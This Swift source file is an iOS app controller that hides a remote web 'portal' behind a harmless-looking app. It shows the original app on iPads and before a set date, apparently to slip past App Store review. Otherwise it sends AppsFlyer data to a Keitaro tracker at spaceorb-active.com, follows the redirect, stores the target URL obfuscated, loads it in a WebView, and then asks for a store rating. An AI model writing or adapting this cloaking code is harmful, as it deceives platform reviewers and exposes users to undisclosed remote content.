import Foundation
internal import Combine
import UIKit
import StoreKit
import AppsFlyerLib

class SweetFlowController: ObservableObject {
    static let shared = SweetFlowController()
    
    @Published var sweetDisplayMode: SweetDisplayState = .preparing
    @Published var sweetCachedEndpoint: String? = nil
    @Published var sweetIsLoading = true
    
    private var sweetIsRefreshingFromRemote = false
    
    private let sweetRemoteConfigEndpoint = "https://spaceorb-active.com/t5SGvRsb"
    
    private let sweetPersistentStateKey = "sweet_persistent_state_v1"
    private let sweetSecuredEndpointKey = "sweet_secured_endpoint_v1"
    private let sweetExtractedIdentifierKey = "sweet_extracted_id_v1"
    private let sweetWebViewShownKey = "sweet_webview_shown"
    private let sweetRatingShownKey = "sweet_rating_shown"
    private let sweetDateCheckKey = "sweet_date_check"
    
    private var sweetAppsFlyerUID: String = ""
    private var sweetAppsFlyerConversionData: [AnyHashable: Any] = [:]
    
    private var sweetSavedPathId: String? {
        get { UserDefaults.standard.string(forKey: sweetExtractedIdentifierKey) }
        set { UserDefaults.standard.set(newValue, forKey: sweetExtractedIdentifierKey) }
    }
    
    private var sweetFallbackState: Bool {
        get { UserDefaults.standard.bool(forKey: sweetPersistentStateKey) }
        set { UserDefaults.standard.set(newValue, forKey: sweetPersistentStateKey) }
    }
    
    private var sweetWebViewShown: Bool {
        get { UserDefaults.standard.bool(forKey: sweetWebViewShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: sweetWebViewShownKey) }
    }
    
    private var sweetRatingShown: Bool {
        get { UserDefaults.standard.bool(forKey: sweetRatingShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: sweetRatingShownKey) }
    }
    
    private init() {
        self.sweetCachedEndpoint = sweetSecureRetrieveEndpoint()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            self.sweetRunInitializationSequence()
        }
    }
    
    private func sweetRunInitializationSequence() {
        sweetPerformInitialValidations()
    }
    
    private func sweetPerformInitialValidations() {
        guard sweetValidateDeviceType() else { return }
        
        guard sweetValidateTemporalCondition() else { return }
        
        guard sweetCheckPersistentState() else { return }
        
        if let endpoint = sweetSecureRetrieveEndpoint(), !endpoint.isEmpty {
            sweetActivatePrimaryMode()
            sweetValidateEndpointInBackground(endpoint)
            return
        }
        
        print("⏳ [SweetFlowController] No cached endpoint - waiting for AppsFlyer conversion data...")
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) { [weak self] in
            guard let self = self else { return }
            
            if self.sweetDisplayMode == .preparing && !self.sweetFallbackState && !self.sweetWebViewShown {
                print("⚠️ [SweetFlowController] AppsFlyer timeout - making request without conversion data")
                
                self.sweetAppsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
                print("🔑 [SweetFlowController] UID after timeout: \(self.sweetAppsFlyerUID), length: \(self.sweetAppsFlyerUID.count)")
                
                self.sweetFetchRemoteConfiguration()
            }
        }
    }
    
    private func sweetValidateDeviceType() -> Bool {
        if UIDevice.current.model == "iPad" {
            sweetActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func sweetValidateTemporalCondition() -> Bool {
        let sweetFormatter = DateFormatter()
        sweetFormatter.dateFormat = "dd.MM.yyyy"
        if let sweetThreshold = sweetFormatter.date(from: "15.01.2025"),
           Date() < sweetThreshold {
            sweetActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func sweetCheckPersistentState() -> Bool {
        if sweetFallbackState {
            sweetActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func sweetSecureStoreEndpoint(_ newValue: String?) {
        guard let sweetEndpoint = newValue else {
            UserDefaults.standard.removeObject(forKey: sweetSecuredEndpointKey)
            print("📝 [SweetFlowController] Endpoint removed from storage")
            DispatchQueue.main.async { self.sweetCachedEndpoint = nil }
            return
        }
        
        if let sweetTransformed = SweetDataProcessor.sweetTransform(sweetEndpoint) {
            UserDefaults.standard.set(sweetTransformed, forKey: sweetSecuredEndpointKey)
            print("📝 [SweetFlowController] Endpoint transformed and stored")
        } else {
            UserDefaults.standard.set(sweetEndpoint, forKey: sweetSecuredEndpointKey)
            print("⚠️ [SweetFlowController] Transform failed, storing plain (fallback)")
        }
        
        DispatchQueue.main.async { self.sweetCachedEndpoint = sweetEndpoint }
    }
    
    private func sweetSecureRetrieveEndpoint() -> String? {
        guard let sweetStored = UserDefaults.standard.string(forKey: sweetSecuredEndpointKey) else {
            print("📝 [SweetFlowController] No endpoint found in storage")
            return nil
        }
        
        if let sweetRestored = SweetDataProcessor.sweetRestore(sweetStored) {
            print("📝 [SweetFlowController] Endpoint restored successfully")
            return sweetRestored
        }
        
        if sweetStored.hasPrefix("http") {
            print("⚠️ [SweetFlowController] Using plain stored value (fallback)")
            return sweetStored
        }
        
        print("❌ [SweetFlowController] Failed to retrieve endpoint")
        return nil
    }
    
    func sweetUpdateAppsFlyerData(sweetUid: String, sweetConversionData: [AnyHashable: Any] = [:]) {
        self.sweetAppsFlyerUID = sweetUid
        self.sweetAppsFlyerConversionData = sweetConversionData
        
        if sweetFallbackState {
            print("⚪ [SweetFlowController] Fallback state is true - skipping AppsFlyer update")
            return
        }
        
        if sweetWebViewShown {
            print("🌐 [SweetFlowController] WebView already shown - keeping current state")
            return
        }
        
        if sweetCachedEndpoint == nil || sweetCachedEndpoint?.isEmpty == true {
            sweetFetchRemoteConfiguration()
        }
    }
    
    private func sweetFetchRemoteConfiguration() {
        let sweetTargetURL = SweetURLConstructor.sweetBuildURL(
            sweetAppsFlyerUID: sweetAppsFlyerUID,
            sweetConversionData: sweetAppsFlyerConversionData
        )
        
        print("🔗 [SweetFlowController] Config URL: \(sweetTargetURL)")
        
        guard let sweetURL = URL(string: sweetTargetURL) else {
            print("❌ [SweetFlowController] Invalid config URL - showing white mode")
            sweetActivateSecondaryMode()
            return
        }
        
        var sweetRequest = URLRequest(url: sweetURL)
        sweetRequest.timeoutInterval = 10.0
        sweetRequest.httpMethod = "GET"
        
        print("📡 [SweetFlowController] Making request...")
        
        URLSession.shared.dataTask(with: sweetRequest) { [weak self] sweetData, sweetResponse, sweetError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                if let sweetError = sweetError {
                    print("❌ [SweetFlowController] Network error: \(sweetError.localizedDescription)")
                    self.sweetActivateSecondaryMode()
                    return
                }
                
                if let sweetHttpResponse = sweetResponse as? HTTPURLResponse {
                    print("📊 [SweetFlowController] HTTP Status: \(sweetHttpResponse.statusCode)")
                    print("🔗 [SweetFlowController] Response URL: \(sweetHttpResponse.url?.absoluteString ?? "nil")")
                    
                    if sweetHttpResponse.statusCode > 403 {
                        print("❌ [SweetFlowController] HTTP error \(sweetHttpResponse.statusCode) - showing white mode")
                        self.sweetActivateSecondaryMode()
                        return
                    }
                    
                    if let sweetFinalURL = sweetHttpResponse.url?.absoluteString {
                        print("🎯 [SweetFlowController] Final URL after redirects: \(sweetFinalURL)")
                        
                        if sweetFinalURL != sweetTargetURL {
                            print("✅ [SweetFlowController] URL changed after redirect - saving and showing WebView")
                            
                            self.sweetExtractAndSavePathId(from: sweetFinalURL)
                            
                            self.sweetIsRefreshingFromRemote = true
                            
                            self.sweetSecureStoreEndpoint(sweetFinalURL)
                            self.sweetActivatePrimaryMode()
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.sweetIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [SweetFlowController] Unexpected response - showing white mode")
                self.sweetActivateSecondaryMode()
            }
        }.resume()
    }
    
    private func sweetValidateEndpointInBackground(_ sweetUrl: String) {
        print("🔍 [SweetFlowController] Validating saved URL in background: \(sweetUrl)")
        
        guard let sweetValidationURL = URL(string: sweetUrl) else {
            print("❌ [SweetFlowController] Invalid saved URL format - fetching new with pathid")
            sweetFetchConfigurationWithPathId()
            return
        }
        
        var sweetValidationRequest = URLRequest(url: sweetValidationURL)
        sweetValidationRequest.timeoutInterval = 10.0
        sweetValidationRequest.httpMethod = "HEAD"
        
        URLSession.shared.dataTask(with: sweetValidationRequest) { [weak self] _, sweetValidationResponse, sweetValidationError in
            guard let self = self else { return }
            
            if let sweetValidationError = sweetValidationError {
                print("❌ [SweetFlowController] Validation network error: \(sweetValidationError.localizedDescription)")
                self.sweetFetchConfigurationWithPathId()
                return
            }
            
            if let sweetValidationHttpResponse = sweetValidationResponse as? HTTPURLResponse {
                print("📊 [SweetFlowController] Validation HTTP Status: \(sweetValidationHttpResponse.statusCode)")
                
                if sweetValidationHttpResponse.statusCode >= 200 && sweetValidationHttpResponse.statusCode <= 403 {
                    print("✅ [SweetFlowController] Saved URL is valid (status \(sweetValidationHttpResponse.statusCode))")
                    return
                } else if sweetValidationHttpResponse.statusCode > 403 {
                    print("❌ [SweetFlowController] Saved URL is dead (status \(sweetValidationHttpResponse.statusCode)) - fetching new with pathid")
                    self.sweetFetchConfigurationWithPathId()
                    return
                }
            }
            
            print("❌ [SweetFlowController] Unexpected validation response - fetching new with pathid")
            self.sweetFetchConfigurationWithPathId()
        }.resume()
    }
    
    private func sweetFetchConfigurationWithPathId() {
        guard let sweetPathId = sweetSavedPathId, !sweetPathId.isEmpty else {
            print("❌ [SweetFlowController] No saved pathId - showing empty WebView")
            sweetActivatePrimaryMode()
            return
        }
        
        let sweetUrlWithPathId = "\(sweetRemoteConfigEndpoint)?pathid=\(sweetPathId)"
        print("🔗 [SweetFlowController] Config URL with pathId: \(sweetUrlWithPathId)")
        
        guard let sweetPathIdURL = URL(string: sweetUrlWithPathId) else {
            print("❌ [SweetFlowController] Invalid config URL with pathId - showing empty WebView")
            sweetActivatePrimaryMode()
            return
        }
        
        var sweetPathIdRequest = URLRequest(url: sweetPathIdURL)
        sweetPathIdRequest.timeoutInterval = 10.0
        sweetPathIdRequest.httpMethod = "GET"
        
        print("📡 [SweetFlowController] Making request to Keitaro with pathId...")
        
        URLSession.shared.dataTask(with: sweetPathIdRequest) { [weak self] sweetPathIdData, sweetPathIdResponse, sweetPathIdError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                if let sweetPathIdError = sweetPathIdError {
                    print("❌ [SweetFlowController] Network error with pathId: \(sweetPathIdError.localizedDescription)")
                    self.sweetActivatePrimaryMode()
                    return
                }
                
                if let sweetPathIdHttpResponse = sweetPathIdResponse as? HTTPURLResponse {
                    print("📊 [SweetFlowController] HTTP Status with pathId: \(sweetPathIdHttpResponse.statusCode)")
                    
                    if sweetPathIdHttpResponse.statusCode > 403 {
                        print("❌ [SweetFlowController] HTTP error \(sweetPathIdHttpResponse.statusCode) with pathId - showing empty WebView")
                        self.sweetActivatePrimaryMode()
                        return
                    }
                    
                    if let sweetPathIdFinalURL = sweetPathIdHttpResponse.url?.absoluteString {
                        print("🎯 [SweetFlowController] Final URL after redirects with pathId: \(sweetPathIdFinalURL)")
                        
                        if sweetPathIdFinalURL != sweetUrlWithPathId {
                            print("✅ [SweetFlowController] URL changed after redirect with pathId - saving and showing WebView")
                            
                            self.sweetIsRefreshingFromRemote = true
                            self.sweetSecureStoreEndpoint(sweetPathIdFinalURL)
                            self.sweetActivatePrimaryMode()
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.sweetIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [SweetFlowController] Unexpected response with pathId - showing empty WebView")
                self.sweetActivatePrimaryMode()
            }
        }.resume()
    }
    
    private func sweetExtractAndSavePathId(from sweetUrl: String) {
        guard let sweetUrlComponents = URLComponents(string: sweetUrl),
              let sweetQueryItems = sweetUrlComponents.queryItems else {
            print("⚠️ [SweetFlowController] Could not parse URL components from: \(sweetUrl)")
            return
        }
        
        for sweetQueryItem in sweetQueryItems {
            if sweetQueryItem.name.lowercased() == "pathid", let sweetPathIdValue = sweetQueryItem.value {
                print("🔑 [SweetFlowController] Found pathId: \(sweetPathIdValue)")
                sweetSavedPathId = sweetPathIdValue
                return
            }
        }
        
        print("⚠️ [SweetFlowController] No pathId parameter found in URL: \(sweetUrl)")
    }
    
    private func sweetActivateSecondaryMode() {
        print("⚪ [SweetFlowController] Setting WHITE mode - showing original app")
        DispatchQueue.main.async {
            self.sweetDisplayMode = .original
            self.sweetFallbackState = true
            self.sweetIsLoading = false
        }
    }
    
    private func sweetActivatePrimaryMode() {
        print("🌐 [SweetFlowController] Setting WEBVIEW mode - showing portal")
        DispatchQueue.main.async {
            self.sweetDisplayMode = .webContent
            self.sweetIsLoading = false
            
            if self.sweetWebViewShown && !self.sweetRatingShown {
                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                    self.sweetShowSystemRatingAlert()
                }
            }
            
            self.sweetWebViewShown = true
        }
    }
    
    func sweetGetCurrentURL() -> String? {
        return sweetSecureRetrieveEndpoint()
    }
    
    func sweetUpdateURL(_ sweetNewURL: String) {
        print("🔄 [SweetFlowController] URL update attempt: \(sweetNewURL)")
        
        if sweetIsRefreshingFromRemote {
            print("🚫 [SweetFlowController] Blocking URL update - currently updating from remote")
            return
        }
        
        if sweetNewURL != sweetRemoteConfigEndpoint && !sweetNewURL.contains("spaceorb-active.com") && sweetNewURL != sweetGetCurrentURL() {
            print("💾 [SweetFlowController] Saving new URL: \(sweetNewURL)")
            sweetSecureStoreEndpoint(sweetNewURL)
        } else {
            print("⏭️ [SweetFlowController] Skipping URL save (tracking domain, same as config, or already saved)")
        }
    }
    
    private func sweetShowSystemRatingAlert() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
            if let sweetWindowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                SKStoreReviewController.requestReview(in: sweetWindowScene)
                self.sweetRatingShown = true
            }
        }
    }
    
    enum SweetDisplayState {
        case preparing
        case original
        case webContent
    }
}
